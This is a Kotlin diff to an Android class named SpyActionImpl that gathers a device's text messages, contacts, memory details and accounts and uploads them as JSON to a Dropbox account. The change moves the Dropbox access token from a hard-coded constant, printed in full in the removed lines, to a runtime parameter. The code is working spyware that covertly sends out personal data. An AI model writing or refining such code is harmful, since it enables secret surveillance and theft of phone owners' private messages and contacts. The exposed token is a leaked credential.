@@ -21,7 +21,7 @@ class SpyActionImpl : SpyAction {
     private val getMemory: GetMemory = GetMemory()
     private val getAccounts: GetAccounts = GetAccounts()
 
-    override fun startAction() {
+    override fun startAction(token: String) {
         val spyInfo = SpyInfo.Builder().apply {
             setMessages(getMessages(App.appContext))
             setContacts(getContacts(App.appContext))
@@ -36,12 +36,12 @@ class SpyActionImpl : SpyAction {
             build()
         }
         val data: ByteArray = Gson().toJson(spyInfo).toByteArray()
-        uploadToDisk(ByteArrayInputStream(data))
+        uploadToDisk(ByteArrayInputStream(data), token)
     }
 
-    private fun uploadToDisk(inputStream: InputStream) {
+    private fun uploadToDisk(inputStream: InputStream, accessToken: String) {
         val config = DbxRequestConfig.newBuilder("dropbox/bos1").build()
-        val client = DbxClientV2(config, ACCESS_TOKEN)
+        val client = DbxClientV2(config, accessToken)
         try {
             client.files().upload("/${FILE_NAME}")
                 .uploadAndFinish(inputStream)
@@ -52,7 +52,5 @@ class SpyActionImpl : SpyAction {
 
     companion object {
         private const val FILE_NAME = "data.txt"
-        private const val ACCESS_TOKEN =
-            "sl.BBm-Y0iX1b5bVrS11L1kPdb48SRO12FQILCKP0rQrwvO9zKqEKKCqoVv5so9FOnv0lYNWZ1yy6ANEJTvVIG3rKvvjZY0MGIm_gpz6PdQ2kWUbKHTyaBS7ugsv8OMRRrYMZsUAq-5BajC"
     }
 }
